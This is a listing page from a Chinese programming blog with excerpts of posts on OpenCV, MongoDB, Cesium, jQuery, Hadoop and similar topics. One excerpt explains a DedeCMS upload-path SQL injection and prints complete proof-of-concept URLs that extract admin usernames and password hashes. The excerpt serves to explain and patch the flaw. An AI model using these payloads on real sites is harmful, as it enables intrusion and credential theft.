<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31dc0327eb9bca8016a60c250f941859/" rel="bookmark">
			用OpenCV实现Photoshop算法(三): 曲线调整
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列文章：
用OpenCV实现Photoshop算法(一): 图像旋转
用OpenCV实现Photoshop算法(二): 图像剪切
用OpenCV实现Photoshop算法(三): 曲线调整
用OpenCV实现Photoshop算法(四): 色阶调整 用OpenCV实现Photoshop算法(五): 亮度对比度调整
用OpenCV实现Photoshop算法(六): 变为黑白图像
用OpenCV实现Photoshop算法(七): 调整色相饱和度
用OpenCV实现Photoshop算法(八): 可选颜色
用OpenCV实现Photoshop算法(九): 高反差保留
三、曲线调整( Curves Adjustment )
曲线调整是Photoshop的最常用的重要功能之一。
网上关于曲线技术原理的材料都不完整。经过一个多月的探索、不断实验，我用OpenCV实现了曲线功能，基本算是揭开了“曲线之谜“。
（一）曲线原理
对于一个RGB图像, 可以对R, G, B 通道进行独立的曲线调整，即，对三个通道分别使用三条曲线（Curve）。还可以再增加一条曲线对 三个通道进行整体调整。 因此，对一个图像，可以用四条曲线调整。最终的结果，是四条曲线调整后合并产生的结果。
我们先来分析对单通道一条曲线的原理，比如：对红色通道定义一条曲线如下：
图中，横轴是输入，比左到右分别表示0到255. 纵轴是输出，从下到上分别表示0到255.
该曲线由三个点定义，座标分别为： 点1（0，0）， 点2（127，154），点3（255，255）
点1和点3是默认产生的， 点2是我们新增加的。在这三个点中画出一条曲线（Spline）.
调整的实现： 当输入（红色通道值）为X1时，将输出值（新的红色通道值）设为曲线对应的值 Y1.
代码实现： 对图片的所有像素点进行扫描， 取红色值 X1, 换为 对应的 Y1. 其它两个通道值（绿蓝）不变。
比如： 像素点的RGB= (127, 230, 220), 其中红色值为 X1 = 127, 对应曲线上的值Y1 = 154, 则对该通道曲线调整后 像素点的RGB= (154, 230, 220)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31dc0327eb9bca8016a60c250f941859/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b5b44d4334e7cdcfe102f4414b31cae/" rel="bookmark">
			MongoDB分组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MongoDB三种分组方式 group(先筛选再分组，不支持分片，对数据量有所限制，效率不高) 【简单分组实测150W 12.5s】mapreduce(基于js引擎，单线程执行，效率较低，适合用做后台统计等) 【简单分组实测150W 28.5s】aggregate(推荐) (性能要高很多，并且使用上要简单些) 【简单分组实测150W 2.6s】 group db.ad_play_log.group({ // https://docs.mongodb.org/manual/reference/method/db.collection.group/ // https://docs.mongodb.org/manual/reference/command/group/#dbcmd.group key: { // 分组的字段 ad_position_id: 1 }, cond: { // WHERE条件 ord_dt: { $gt: new Date('01/01/2012') } }, reduce: function (curr, result) { result.count++; }, initial: { count: 0 }});// SELECT ad_play_log, SUM(material_id) as total// FROM orders// WHERE ord_dt &gt; '01/01/2012'// GROUP BY ad_position_id MapReduce db.runCommand({ mapreduce: "ad_play_log", map: function Map() { var key = { ad_position_id: this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b5b44d4334e7cdcfe102f4414b31cae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77daa13b29d7147683bfde631e1efb78/" rel="bookmark">
			Cesium学习笔记（2）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		修改于2017.1.9
（1）坐标系转换
cesium中常用的坐标有两种WGS84地理坐标系和笛卡尔空间坐标系(世界坐标)。我们平时常用的以经纬度来指明一个地点就是用的WGS84坐标，笛卡尔空间坐标系常用来做一些空间位置变换如平移旋转缩放等等。二者的联系如下图, 笛卡尔空间坐标的原点就是椭球的中心.
Pick----屏幕坐标 Cartesian----世界坐标 cartographic-----地理坐标（弧度） Point----经纬度坐标 1.屏幕坐标转世界坐标 var pick= new Cesium.Cartesian2(window.innerWidth,window.innerHeight); var cartesian = scene.globe.pick(viewer.camera.getPickRay(pick), scene); 注：一共是两步
(在2D下上述方法不适用，改成：
var pick= new Cesium.Cartesian2(0,0); var cartesian = viewer.camera.pickEllipsoid(pick, viewer.scene.globe.ellipsoid); )
2.世界坐标转地理坐标（弧度） var cartographic = scene.globe.ellipsoid.cartesianToCartographic(cartesian); 或 var cartographic = Cesium.Cartographic.fromCartesian(cartesian); 3.世界坐标转屏幕坐标 var pick = Cesium.SceneTransforms.wgs84ToWindowCoordinates(viewer.scene, cartesian); 4.地理坐标（弧度）转经纬度坐标 var point=[ cartographic.longitude / Math.PI * 180, cartographic.latitude / Math.PI * 180]; 5.地理坐标（弧度）转世界坐标 var cartesian = scene.globe.ellipsoid. cartographicTo Cartesian (cartographic); 6.经纬度坐标转地理坐标（弧度） var cartographic = Cesium.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/77daa13b29d7147683bfde631e1efb78/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eaac15500ba24fdf2a5da05d78ad6307/" rel="bookmark">
			白话空间统计番外四：轨迹特征分析实例  2016年9月9日 12:44
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前面的话：
本文是近期对空间聚类和特征分析研究的总结性文档之一，有对这些算法有兴趣的同学，可以与我联系，另外如果有同学做毕业论文想做相关思路的，也可以与我联系，我可以以企业导师的身份进行指导，具体的要求，联系时候会详述。
—————————————————我是分割线———————————————————
车辆的的轨迹数据是车辆行驶的客观记录，轨迹中虽然仅仅包含了最基础的位置以及时间信息，但是通过这些信息，可以发掘大量有关车辆以及驾驶员的特征，这篇文章就通过一个简单的分析，来简单说明一下通过车辆轨迹数据进行数据挖掘的实例。
首先，先看看车辆的轨迹数据是什么样子的，下面是一份北京市某公司的旅游大巴车辆一天24小时的轨迹数据（当然，真实的GPS数据还会有一些其他的信息，但是这里仅保留最简单的空间和时间数据），如下：
其中，cid是车辆的编号，time是记录的时间，x和y分别是经度和纬度，一共抽取了三辆汽车的数据进行测试。
一般说来，车辆轨迹位置特征可以对应于点数据的分析模式来看，但是车辆的行驶特征，挂上了行驶二字，单独一个点就没有啥意义了，就变成了点与点之间连线成若干个连续线段的轨迹线数据了。而线的特征，主要就是长度和方向，所以行驶特征类推出来，无非就是行车的速度和行车的方向，速度这个问题好理解，但是如何来对速度数据进行特征化，这一直是一个问题。
对于统计学家来说，经常用的无非就是最高、最低、平均这样的描述信息，但是这种对全部信息总体性描述，虽然能够反映部分特征，但是未免有些简单粗暴。所以这次我们使用一个比综合性统计数据更为效果好一些的分布性描述数据来进行分析挖掘。
如下面是三辆不同的车的轨迹数据，我们将它绘制地图上：分别标记为b1、b2和b3。
从上面的轨迹可以看出，b2中间有一大段数据丢失了，因为轨迹数据是连续的，所以很容易通过内插等方法进行补全。但是就算补全了，里面还留下了一个问题：每一辆车每天行驶的里程数是不同的，所以所留下来的数据也是不同的。
如何通过这样的一份数据对车辆行驶的特征进行识别呢？
首先，自然就是速度了，速度的计算非常容易，无非就是两个点之间的距离间隔除以时间间隔，虽然轨迹数据肯定会出现间断或者丢失，就算经过处理之后，还是会有一定的精度丢失……那么用什么方法让这种精度丢失的影响在我们的计算中最小呢？
很简单，分成若干类别就好。分类之后，没一个点的具体数值就变成了一个区间值，所受的影响就降低很多了。
但是分类需要有先验条件，要有具体的分类标准才行，如何去找这些是条件是比较麻烦，所以这里就采用更优化的一种方式：聚类分析。
关于聚类分析的算法这里就不表述了，网络上各种文献里面汗牛充栋。大家有兴趣的自己去查，算法牛人们也可以自己去实现，我这里就偷个懒，直接用R语言提供的k-means算法直接进行聚类了。
利用聚类算法，把整个轨迹数据分为5类，结果如下：
通过行车速度进行聚类之后，明显可以看出，b1和b3（b3的大部分区域）的颜色混杂比较严重，这样就说明了他们的速度变化得比较明显（也就是不够均衡），而b2点之间的颜色变化相对比较少，就说明了b2的车速相对比较均衡。
这样仅仅是定睛一看的话，有些主观因素在里面（当然，经验也是很重要的判断依据），不够对于统计来说，少了量化结果，多多少少就给人不专业的感觉。
所以，下面我们来进行量化对比。
速度如何进行量化对比？他们的区域不一样，留下的点数也不一样……为了让它们能够在一个尺度上进行比较，最简单方式，就是利用不同速度的密度分布情况进行对比。
那么我们把三辆车的速度密度分布先计算出来，结果如下：
主要密度带宽为0.5的时候，结果如上，可以看见，0附件的数据最多，因为旅游车辆的特征与出租车不一样，出租车一天大部分时间都在路上运行，而旅游包车大部分时间都在停车。这样看起来，整个分布好像差不多，我们放大一个细节部分看看，比如10-20这个区间。
结果也可以看出，b1和b3的分布波动比较大，而b2的分布波动相对均衡。
这样还是定睛一看，下面我们通过perrson相似度系数来对这三个数据进行计算如下：
b1与b3的速度密度分布相似系数高达0.79，而他们两个与b2的相关系数都小于0.01。
下面我们对行车的方向进行密度分布分析，结果如下：
从行车角度上来看，三辆车的高峰，都在0度附件，有所不同的是b2与b3在0度位置的分布要远高与b1，而b3在-90度（北向南）方向，和-45度（东南方向）有明显的聚集。
然后同样对密度分布进行相似性计算，如下：
可以看出，b2与b3的相似性高于他们与b1的相似性。
最后得出来的结果，就是b1和b2所运行的区域交通特征大致相似（速度分布差不多），而b1和b3的行驶方向大致相似。
总结一下，以上两种方法，主要是通过对速度和行车角度的密度分布进行对比，将密度分布作为行驶特征来进行提取。
当然，还有更多的行驶特征可以提取，以后会逐一说明。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6532bfcec26e73d2aaab86deb959a435/" rel="bookmark">
			为什么使用 getter 和 setter
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 以下几点是我发现的优势： 使用 getter 和 setter 访问变量，这样可以在后期更方便地增加功能（例如验证某个变量是否符合要求）内部存储格式和外部呈现不同（比如内部存1表示，外部表示1年以上，1岁以上）可以保持外部接口不变的情况下，修改内部存储方式和逻辑控制生命周期和内存管理，在没有内存管理的语言中特别重要（如 C++、Object-C）当变量在运行时改变，可以断点调试进来，某些语言如果没有访问器会很难 debug提升和类库的交互性，如模拟数据（mock），序列化通过重写来允许继承类改变属性允许 getter/setter 作为 lambda 表达式传递而不是传递值 getter/setter 可以有不同的访问权限，如 getter 是 public，setter 是 protect 翻译自： http://stackoverflow.com/questions/1568091/why-use-getters-and-setters 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26db2ca8ec167e8b295515b7d6a49296/" rel="bookmark">
			Fio压测工具和io队列深度理解和误区
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Fio 是个强大的IO压力测试工具，我之前写过不少fio的使用和实践，参见 这里。
随着块设备的发展，特别是SSD盘的出现，设备的并行度越来越高。利用好这些设备，有个诀窍就是提高设备的iodepth, 一把喂给设备更多的IO请求，让电梯算法和设备有机会来安排合并以及内部并行处理，提高总体效率。
应用使用IO通常有二种方式：同步和异步。 同步的IO一次只能发出一个IO请求，等待内核完成才返回，这样对于单个线程iodepth总是小于1，但是可以透过多个线程并发执行来解决，通常我们会用16-32根线程同时工作把iodepth塞满。 异步的话就是用类似libaio这样的linux native aio一次提交一批，然后等待一批的完成，减少交互的次数，会更有效率。
io队列深度通常对不同的设备很敏感，那么如何用fio来探测出合理的值呢？
让我们先来看下和iodepth相关的参数：
iodepth=int
Number of I/O units to keep in flight against the file. Note that increasing iodepth beyond 1 will not affect synchronous ioengines
(except for small degress when verify_async is in use). Even async engines my impose OS restrictions causing the desired depth not to be
achieved. This may happen on Linux when using libaio and not setting direct=1, since buffered IO is not async on that OS.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/26db2ca8ec167e8b295515b7d6a49296/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed797469149c9aecefcdd2d9e3f7c66c/" rel="bookmark">
			Android中hardware源码（android-5.0.2）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android中hardware源码（android-5.0.2）
路径：android-5.0.2/hardware/libhardware/include/hardware/hardware.h
hardware.h
/* * Copyright (C) 2008 The Android Open Source Project * * Licensed under the Apache License, Version 2.0 (the "License"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed797469149c9aecefcdd2d9e3f7c66c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c1999ac77fcf185463ab86bab329290/" rel="bookmark">
			jquery操作select下拉框的多种方法(选中,取值,赋值等)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Query获取Select选择的Text和Value:
语法解释：
1.$("#select_id").change(function(){//code...}); //为Select添加事件，当选择其中一项时触发
2. varcheckText=$("#select_id").find("option:selected").text(); //获取Select选择的Text
3. varcheckValue=$("#select_id").val(); //获取Select选择的Value
4. var checkIndex=$("#select_id").get(0).selectedIndex; //获取Select选择的索引值
5. var maxIndex=$("#select_idoption:last").attr("index"); //获取Select最大的索引值
jQuery设置Select选择的Text和Value: 语法解释： 1. $("#select_id").get(0).selectedIndex=1; //设置Select索引值为1的项选中
2. $("#select_id ").val(4); // 设置Select的Value值为4的项选中
3. $("#select_idoption[text='jQuery']").attr("selected", true); //设置Select的Text值为jQuery的项选中
jQuery添加/删除Select的Option项：
语法解释：
1. $("#select_id").append("&lt;optionvalue='Value'&gt;Text&lt;/option&gt;"); //为Select追加一个Option(下拉项)
2. $("#select_id").prepend("&lt;optionvalue='0'&gt;请选择&lt;/option&gt;"); //为Select插入一个Option(第一个位置)
3. $("#select_idoption:last").remove(); //删除Select中索引值最大Option(最后一个)
4. $("#select_idoption[index='0']").remove(); //删除Select中索引值为0的Option(第一个)
5. $("#select_idoption[value='3']").remove(); //删除Select中Value='3'的Option
5. $("#select_idoption[text='4']").remove(); //删除Select中Text='4'的Option
jquery radio取值，checkbox取值，select取值，radio选中，checkbox选中，select选中，及其相关
获 取一组radio被选中项的值
var item = $('input[@name=items][@checked]').val();
获 取select被选中项的文本
var item = $("select[@name=items]option[@selected]").text();
select下拉框的第二个元素为当前选中值
$('#select_id')[0].selectedIndex = 1;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c1999ac77fcf185463ab86bab329290/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87493a56d58653dfab2670bfa312b1ec/" rel="bookmark">
			大数据经典学习路线（及供参考）资料群：905572354（新群）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Linux基础和分布式集群技术
学完此阶段可掌握的核心能力：
熟练使用Linux，熟练安装Linux上的软件，了解熟悉负载均衡、高可靠等集群相关概念，搭建互联网高并发、高可靠的服务架构；
学完此阶段可解决的现实问题：
搭建负载均衡、高可靠的服务器集群，可以增大网站的并发访问量，保证服务不间断地对外服务；
学完此阶段可拥有的市场价值：
具备初级程序员必要具备的Linux服务器运维能力。
1.内容介绍：
在大数据领域，使用最多的操作系统就是Linux系列，并且几乎都是分布式集群。该课程为大数据的基础课程，主要介绍Linux操作系统、Linux常用命令、Linux常用软件安装、Linux网络、防火墙、Shell编程等。
2.案例：搭建互联网高并发、高可靠的服务架构。
2.离线计算系统课程阶段 1. 离线计算系统课程阶段
HADOOP核心技术框架
学完此阶段可掌握的核心能力：
1、通过对大数据技术产生的背景和行业应用案例了解hadoop的作用；2、掌握hadoop底层分布式文件系统HDFS的原理、操作和应用开发；3、掌握MAPREDUCE分布式运算系统的工作原理和分布式分析应用开发；4、掌握HIVE数据仓库工具的工作原理及应用开发。
学完此阶段可解决的现实问题：
1、熟练搭建海量数据离线计算平台；2、根据具体业务场景设计、实现海量数据存储方案；3、根据具体数据分析需求实现基于mapreduce的分布式运算程序；
学完此阶段可拥有的市场价值：
具备企业数据部初级应用开发人员的能力
1.1 HADOOP快速入门
1.1.1 hadoop知识背景
什么是hadoop、hadoop产生背景、hadoop在大数据云计算中的位置和关系、国内hadoop的就业情况分析及课程大纲介绍
国内外hadoop应用案例介绍
分布式系统概述、hadoop生态圈及各组成部分的简介
1.1.2 HIVE快速入门
hive基本介绍、hive的使用、数据仓库基本知识
1.1.3 数据分析流程案例
web点击流日志数据挖掘的需求分析、数据来源、处理流程、数据分析结果导出、数据展现
1.1.4 hadoop数据分析系统集群搭建
集群简介、服务器介绍、网络环境设置、服务器系统环境设置、JDK环境安装、hadoop集群安装部署、集群启动、集群状态测试
HIVE的配置安装、HIVE启动、HIVE使用测试
1.2 HDFS详解
1.2.1 HDFS的概念和特性
什么是分布式文件系统、HDFS的设计目标、HDFS与其他分布式存储系统的优劣势比较、HDFS的适用场景
1.2.2 HDFS的shell操作
HDFS命令行客户端启动、HDFS命令行客户端的基本操作、命令行客户端支持的常用命令、常用参数介绍
1.2.3 HDFS的工作机制
HDFS系统的模块架构、HDFS写数据流程、HDFS读数据流程
NAMENODE工作机制、元数据存储机制、元数据手动查看、元数据checkpoint机制、NAMENODE故障恢复、DATANODE工作机制、DATANODE动态增减、全局数据负载均衡
1.2.4 HDFS的java应用开发
搭建开发环境、获取api中的客户端对象、HDFS的java客户端所具备的常用功能、HDFS客户端对文件的常用操作实现、利用HDFS的JAVA客户端开发数据采集和存储系统
1.3 MAPREDUCE详解
1.3.1 MAPREDUCE快速上手
为什么需要MAPREDUCE、MAPREDUCE程序运行演示、MAPREDUCE编程示例及编程规范、MAPREDUCE程序运行模式、MAPREDUCE程序调试debug的几种方式
1.3.2 MAPREDUCE程序的运行机制
MAPREDUCE程序运行流程解析、MAPTASK并发数的决定机制、MAPREDUCE中的combiner组件应用、MAPREDUCE中的序列化框架及应用、MAPREDUCE中的排序、MAPREDUCE中的自定义分区实现、MAPREDUCE的shuffle机制、MAPREDUCE利用数据压缩进行优化、MAPREDUCE程序与YARN之间的关系、MAPREDUCE参数优化
通过以上各组件的详解，深刻理解MAPREDUCE的核心运行机制，从而具备灵活应对各种复杂应用场景的能力
MAPREDUCE实战编程案例：通过一个实战案例来熟悉复杂MAPREDUCE程序的开发。该程序是从nginx服务器产生的访问服务器中计算出每个访客的访问次数及每次访问的时长。原始数据样例如下：
通过一系列的MAPREDUCE程序——清洗、过滤、访问次数及时间分析，最终计算出需求所要的结果，用于支撑页面展现：
1.4 HIVE增强
1.4.1 HIVE基本概念
HIVE应用场景、HIVE内部架构、HIVE与hadoop的关系、HIVE与传统数据库对比、HIVE的数据存储机制、HIVE的运算执行机制
1.4.2 HIVE基本操作
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87493a56d58653dfab2670bfa312b1ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b48be36a8ab37823c05df00b0262baf4/" rel="bookmark">
			C#编程启航（一）visual studio 2015 的安装与语言包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		好吧，今天咱就把C#的编程环境熟悉一下，然后就是就可以开启咱的C#编程之路 作为C#编程人员，VISUAL STUDIO 是咱的重量级的武器，而最新版2015版的visual studio 是咱的最新最先进的武器。而且作为逐步开源的微软，visual studio已经开启免费版本啦，不用天朝工作在一线的破解人员，夜以继日的破解啦。 安装过程就不再呈现啦，因为很简单，并且体积巨大，不便下载演示。 等你装好了，咱就开始，首先是咱得用咱的母语，进行首次开发熟悉一下编程环境，因为英文版本的熟悉环境比较慢，那咱就先进行汉化工作吧！ 其实在为微软这样的龙头企业级的公司，肯定为全世界的工作人员考虑到啦，就是语言包，所以咱不用下载什么破解汉化机啥的，直接利用微软给全世界准备的语言包就行。 开始吧，安装好，打开后你就能看到主界面 然后主菜单栏有一个tools 工具按钮 点击 options （如图） 然后 按上图进行点击 get additions languages 链接也可以直接点击下面的链接 https://www.microsoft.com/en-us/download/details.aspx?id=48157 进入网页，就是这样，然后你选择，你的要设置的语言，然后点击下载（Download） 然后下载完得到如图这么一个东西 然后双击安装，点击完，就会进入如图安装界面。 然后下一步。 然后如果你的电脑是win10 就会就会，自动跳转到，设置页，你需要调到开发者模式才能继续安装工具包！！ 然后就可以继续安装啦！！！ 然后就安装完成啦！！！ 然后就是切换语言啦，重新进入刚刚的界面！！！ 然后 点击tools ---》 options 然后 就进到啦下面的界面，然后 按图走 然后点击ok 然后 就会提醒你需要重启一下。 点击确定 重启一下就好了！！！ 然后就可以啦！！！ 转载于:https://www.cnblogs.com/zhuhengjie/p/5966844.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9042cabee3f0d0e6af3bbcbacddc3e2d/" rel="bookmark">
			Duilib界面库使用简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Duilib简介 windows下一款非常好的界面库，实现了UI和逻辑代码的分离，详细介绍百度即可。 使用步骤 如何下载编译duilib我就不说了，github上有编译好的，这里假设你已经有了duilib库的编译好的文件 1.引入头文件，库文件 /引入duilib头文件和库文件 #include &lt;OAIdl.h&gt;//duilib依赖这个vc头文件，如果没有引入的话要引入以下 #include &lt;UIlib.h&gt; using namespace DuiLib; #ifdef _DEBUG # ifdef _UNICODE # pragma comment(lib, "DuiLib_ud.lib") # else # pragma comment(lib, "DuiLib_d.lib") # endif #else # ifdef _UNICODE # pragma comment(lib, "DuiLib_u.lib") # else # pragma comment(lib, "DuiLib.lib") # endif #endif 2.自定义duilib窗口类，继承CWindowWnd和INotifyUI，实现相关虚函数 详细代码下面会贴出 3.在程序入口函数中创建自定义类对象显示窗口即可 int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) { //设置程序实例句柄 CPaintManagerUI::SetInstance(hInstance); //创建并显示窗口 CDuiFrameWnd duiFrame; duiFrame.Create(NULL, _T("DUIWnd"), UI_WNDSTYLE_FRAME, WS_EX_WINDOWEDGE); duiFrame.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9042cabee3f0d0e6af3bbcbacddc3e2d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2f44a923bb85b3e2d376d51b2bde8d7/" rel="bookmark">
			solve the error : Could not open lock file /var/lib/apt/lists/lock
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题如下：
在安装文件包时，可能会出现如下提示错误
E: Could not get lock /var/lib/apt/lists/lock - open (11 Resource temporarily unavailable)
E: Unable to lock the list directory 问题解决： It means in this case that a synaptic or upgrade had quit without cleaning the lock file and future package manager (update, synaptic, apt-get) see the list as locked.
quit synaptic, in terminal:
sudo rm /var/lib/apt/lists/lock 这样就应该OK了。
具体如下：
1、ps-aux 查出apt-get进程的PID，通常是一个四位数字。
2、用sudo kill PID代码 杀死进程
3、用sudo apt-get update，sudo apt-get dist-upgrade升级。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e2f44a923bb85b3e2d376d51b2bde8d7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e3edde07c5afa1a779939fd35044fc4/" rel="bookmark">
			正确性、健壮性、可靠性、效率、易用性、可读性（可理解性）、可扩展性、可复 用性、兼容性、可移植性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 现在国内IT 企业拥有学士、硕士、博士文凭的软件开发人员比比皆是，但他们在接 受大学教育时就“先天不足”，岂能一到企业就突然实现质的飞跃。试问有多少软件开发 人员对正确性、健壮性、可靠性、效率、易用性、可读性（可理解性）、可扩展性、可复 用性、兼容性、可移植性等质量属性了如指掌？并且能在实践中运用自如？。“高质量” 可不是干活小心点就能实现的！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/685b791625c19e491179cd3d8e8434fb/" rel="bookmark">
			dedecms上传漏洞uploadsafe.inc.php 整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自从买了阿里云的ecs 之后每次出现漏洞阿里云盾就会通知，前段时间部署的项目检测出上传漏洞
根据网上大神们的博客整理了下，下面这个是可行的
dedecms上传漏洞uploadsafe.inc.php，这里整理了大神们对于这个漏洞的解释
1. 漏洞描述 1. dedecms原生提供一个"本地变量注册"的模拟实现，原则上允许黑客覆盖任意变量 2. dedecms在实现本地变量注册的时候，会对$_GET、$_POST、$_COOKIE等的value值进行addslash转移过滤处理 //$key值注入不在本文讨论范围内，详情参阅：http://www.cnblogs.com/LittleHann/p/4505694.html 3. 在处理文件上传的逻辑中，存在一条攻击路径，程序自己"反处理"了addslash逻辑，使用于闭合的单引号重新获得攻击效果，造成SQL注入 Relevant Link: http://0day5.com/archives/1346 2. 漏洞触发条件
0x1: POC1 plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294 ?action= &amp;aid=1 &amp;_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+ &amp;_FILES[type][name]=1.jpg &amp;_FILES[type][type]=application/octet-stream &amp;_FILES[type][size]=4294 0x2: POC2 http://DEDD/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin` limit+0,1),5,6,7,8,9%23@`\'`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=6873 0x3: POC3 http://DEDE/plus/recommend.php?aid=1&amp;_FILES[type][name]&amp;_FILES[type][size]&amp;_FILES[type][type]&amp;_FILES[type][tmp_name]=aa\'and+char(@`'`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,group_concat(userid,0x23,pwd),5,6,7,8,9 from `%23@__admin`%23 0x4: POC入侵方式 1. 原始数据 \%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+ 2.URL提交进来后，\ 和 ’ 分别被转义成 \\ 和 \’ \\\' or mid=@`\\\'`/*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from`#@__admin` limit 0,1),5,6,7,8,9#@`\\\'` 3.URL被带入include/common.inc.php中检查，此步数据未发生变化 4.然后来到了include/uploadsafe.inc.php中，经过第行str_replace后，\\被过滤成了\，用于攻击闭合的单引号重新获得攻击能力 $$_key = $_FILES[$_key]['tmp_name'] =str_replace("\\\\", "\\", $_FILES[$_key]['tmp_name']); \\' or mid=@`\\'`/*!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/685b791625c19e491179cd3d8e8434fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f8dc322913d96b1c340db30ef7b934e/" rel="bookmark">
			android模拟器上网设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在命令行中输入：
emulator @模拟器名称
启动Android 模拟器后，　输入：
adb shell
进入adb shell模式：
通过setprop命令进行设置
